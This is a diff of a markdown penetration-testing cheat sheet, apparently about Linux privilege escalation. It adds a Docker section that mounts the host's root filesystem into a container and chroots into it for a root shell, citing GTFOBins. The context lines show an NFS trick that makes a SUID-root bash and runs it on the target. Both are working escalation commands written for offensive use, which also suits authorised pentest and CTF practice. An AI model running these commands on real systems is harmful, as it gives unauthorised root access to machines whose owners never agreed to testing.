@@ -375,8 +375,13 @@ sudo chown root:root /tmp/nfs/bash # our kali
 sudo chmod +xs /tmp/nfs/bash # our kali
 /tmp/bash -ip # target machine
 ```
-
-
+## Docker ✅
+```bash
+./docker ps # find image name (1)
+./docker images # find image name (2)
+./docker run -v /:/mnt --rm -it <image name> chroot /mnt sh
+```
+[docker-gtfobins](https://gtfobins.github.io/gtfobins/docker/)
 
 #### The following list shows the most commons file extensions for linux: ❗️☪️
 ```bash
